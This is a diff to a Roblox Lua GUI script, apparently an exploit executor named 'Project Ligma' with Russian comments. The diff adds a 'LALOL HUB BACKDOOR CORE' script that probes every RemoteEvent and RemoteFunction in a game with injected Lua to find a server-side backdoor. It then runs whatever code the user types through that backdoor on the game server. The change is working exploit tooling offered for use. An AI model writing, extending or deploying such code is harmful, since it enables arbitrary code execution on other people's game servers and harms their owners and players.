@@ -150,47 +150,51 @@ LMG2L["LocalScript_13"] = Instance.new("LocalScript", LMG2L["exec_12"]);
 
 
 
-LMG2L["LocalScript_14"] = Instance.new("LocalScript", LMG2L["exec_12"]);
+LMG2L["LocalScript2_14"] = Instance.new("LocalScript", LMG2L["exec_12"]);
+LMG2L["LocalScript2_14"]["Name"] = [[LocalScript2]];
 
 
-
-LMG2L["ImageButton_15"] = Instance.new("ImageButton", LMG2L["Frame_2"]);
-LMG2L["ImageButton_15"]["BorderSizePixel"] = 0;
-LMG2L["ImageButton_15"]["BackgroundTransparency"] = 1;
--- LMG2L["ImageButton_15"]["ImageContent"] = ;
-LMG2L["ImageButton_15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["ImageButton_15"]["Image"] = [[rbxassetid://87162794]];
-LMG2L["ImageButton_15"]["Size"] = UDim2.new(0.05682, 0, 0.10417, 0);
-LMG2L["ImageButton_15"]["Position"] = UDim2.new(0.00379, 0, 0.00694, 0);
+LMG2L["LocalScript3_15"] = Instance.new("LocalScript", LMG2L["exec_12"]);
+LMG2L["LocalScript3_15"]["Name"] = [[LocalScript3]];
 
 
-LMG2L["Name_16"] = Instance.new("TextLabel", LMG2L["Frame_2"]);
-LMG2L["Name_16"]["TextWrapped"] = true;
-LMG2L["Name_16"]["BorderSizePixel"] = 0;
-LMG2L["Name_16"]["TextScaled"] = true;
-LMG2L["Name_16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["Name_16"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-LMG2L["Name_16"]["BackgroundTransparency"] = 1;
-LMG2L["Name_16"]["Size"] = UDim2.new(0.23485, 0, 0.05556, 0);
-LMG2L["Name_16"]["Text"] = [[Project Ligma]];
-LMG2L["Name_16"]["Name"] = [[Name]];
-LMG2L["Name_16"]["Position"] = UDim2.new(0.04545, 0, 0.04167, 0);
+LMG2L["ImageButton_16"] = Instance.new("ImageButton", LMG2L["Frame_2"]);
+LMG2L["ImageButton_16"]["BorderSizePixel"] = 0;
+LMG2L["ImageButton_16"]["BackgroundTransparency"] = 1;
+-- LMG2L["ImageButton_16"]["ImageContent"] = ;
+LMG2L["ImageButton_16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["ImageButton_16"]["Image"] = [[rbxassetid://87162794]];
+LMG2L["ImageButton_16"]["Size"] = UDim2.new(0.05682, 0, 0.10417, 0);
+LMG2L["ImageButton_16"]["Position"] = UDim2.new(0.00379, 0, 0.00694, 0);
 
 
-LMG2L["TextBox_17"] = Instance.new("TextBox", LMG2L["Frame_2"]);
-LMG2L["TextBox_17"]["TextWrapped"] = true;
-LMG2L["TextBox_17"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-LMG2L["TextBox_17"]["TextScaled"] = true;
-LMG2L["TextBox_17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-LMG2L["TextBox_17"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-LMG2L["TextBox_17"]["Size"] = UDim2.new(0.73485, 0, 0.79167, 0);
-LMG2L["TextBox_17"]["Position"] = UDim2.new(0.0303, 0, 0.11806, 0);
-LMG2L["TextBox_17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-LMG2L["TextBox_17"]["Text"] = [[]];
+LMG2L["Name_17"] = Instance.new("TextLabel", LMG2L["Frame_2"]);
+LMG2L["Name_17"]["TextWrapped"] = true;
+LMG2L["Name_17"]["BorderSizePixel"] = 0;
+LMG2L["Name_17"]["TextScaled"] = true;
+LMG2L["Name_17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["Name_17"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["Name_17"]["BackgroundTransparency"] = 1;
+LMG2L["Name_17"]["Size"] = UDim2.new(0.23485, 0, 0.05556, 0);
+LMG2L["Name_17"]["Text"] = [[Project Ligma]];
+LMG2L["Name_17"]["Name"] = [[Name]];
+LMG2L["Name_17"]["Position"] = UDim2.new(0.04545, 0, 0.04167, 0);
 
 
-LMG2L["Draggable2_18"] = Instance.new("LocalScript", LMG2L["Frame_2"]);
-LMG2L["Draggable2_18"]["Name"] = [[Draggable2]];
+LMG2L["TextBox_18"] = Instance.new("TextBox", LMG2L["Frame_2"]);
+LMG2L["TextBox_18"]["TextWrapped"] = true;
+LMG2L["TextBox_18"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextBox_18"]["TextScaled"] = true;
+LMG2L["TextBox_18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["TextBox_18"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+LMG2L["TextBox_18"]["Size"] = UDim2.new(0.73485, 0, 0.79167, 0);
+LMG2L["TextBox_18"]["Position"] = UDim2.new(0.0303, 0, 0.11806, 0);
+LMG2L["TextBox_18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+LMG2L["TextBox_18"]["Text"] = [[]];
+
+
+LMG2L["Draggable2_19"] = Instance.new("LocalScript", LMG2L["Frame_2"]);
+LMG2L["Draggable2_19"]["Name"] = [[Draggable2]];
 
 
 local function C_4()
@@ -368,7 +372,7 @@ local function C_13()
 end;
 task.spawn(C_13);
 local function C_14()
-	local script = LMG2L["LocalScript_14"];
+	local script = LMG2L["LocalScript2_14"];
 	-- exec.LocalScript (оригинальный фрагмент из Project Ligma)	
 	
 	local button = script.Parent  -- Кнопка EXE	
@@ -456,8 +460,99 @@ local function C_14()
 	button.MouseButton1Click:Connect(execute)	
 end;
 task.spawn(C_14);
-local function C_18()
-	local script = LMG2L["Draggable2_18"];
+local function C_15()
+	local script = LMG2L["LocalScript3_15"];
+	-- ВСТАВИТЬ В КНОПКУ EXE (локальный скрипт)	
+	
+	local button = script.Parent	
+	local frame = button.Parent	
+	local textBox = frame:WaitForChild("TextBox")	
+	
+	-- ========== LALOL HUB BACKDOOR CORE ==========	
+	local alphabet = {}	
+	for i = 65, 90 do table.insert(alphabet, string.char(i)) end	
+	for i = 97, 122 do table.insert(alphabet, string.char(i)) end	
+	
+	local function generateName(length)	
+	    local text = ""	
+	    for i = 1, length do	
+	        text = text .. alphabet[math.random(1, #alphabet)]	
+	    end	
+	    return text	
+	end	
+	
+	local function runRemote(remote, data)	
+	    if remote:IsA("RemoteEvent") then	
+	        remote:FireServer(data)	
+	    elseif remote:IsA("RemoteFunction") then	
+	        task.spawn(function() remote:InvokeServer(data) end)	
+	    end	
+	end	
+	
+	local function findBackdoor()	
+	    local remotes = {}	
+	    local ReplicatedStorage = game:GetService("ReplicatedStorage")	
+	    	
+	    -- Защищённый бэкдор	
+	    local protectedBackdoor = ReplicatedStorage:FindFirstChild('lh' .. game.PlaceId/6666*1337*game.PlaceId)	
+	    if protectedBackdoor and protectedBackdoor:IsA("RemoteFunction") then	
+	        local code = generateName(math.random(12,30))	
+	        task.spawn(function()	
+	            protectedBackdoor:InvokeServer("", "a=Instance.new('Model',workspace)a.Name='"..code.."'")	
+	        end)	
+	        remotes[code] = protectedBackdoor	
+	    end	
+	    	
+	    -- Сканируем всех потомков	
+	    for _, remote in ipairs(game:GetDescendants()) do	
+	        if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then	
+	            local fullName = remote:GetFullName()	
+	            if string.split(fullName, ".")[1] ~= "RobloxReplicatedStorage" then	
+	                local code = generateName(math.random(12,30))	
+	                runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")	
+	                remotes[code] = remote	
+	            end	
+	        end	
+	    end	
+	    	
+	    -- Проверяем появление моделей	
+	    for _ = 1, 50 do	
+	        for code, remote in pairs(remotes) do	
+	            if workspace:FindFirstChild(code) then	
+	                return remote	
+	            end	
+	        end	
+	        task.wait()	
+	    end	
+	    	
+	    return nil	
+	end	
+	
+	-- ========== ВЫПОЛНЕНИЕ ПРИ НАЖАТИИ ==========	
+	button.MouseButton1Click:Connect(function()	
+	    local code = textBox.Text	
+	    if code == "" then	
+	        warn("TextBox is empty")	
+	        return	
+	    end	
+	    	
+	    button.Text = "SEARCHING..."	
+	    local backdoor = findBackdoor()	
+	    	
+	    if backdoor then	
+	        button.Text = "EXE"	
+	        runRemote(backdoor, code)	
+	    else	
+	        button.Text = "FAILED"	
+	        task.wait(1)	
+	        button.Text = "EXE"	
+	        warn("Backdoor not found")	
+	    end	
+	end)	
+end;
+task.spawn(C_15);
+local function C_19()
+	local script = LMG2L["Draggable2_19"];
 	local player = game.Players.LocalPlayer	
 	local mouse = player:GetMouse()	
 	
@@ -475,6 +570,6 @@ local function C_18()
 		end	
 	end)	
 end;
-task.spawn(C_18);
+task.spawn(C_19);
 
 return LMG2L["ScreenGui_1"], require;
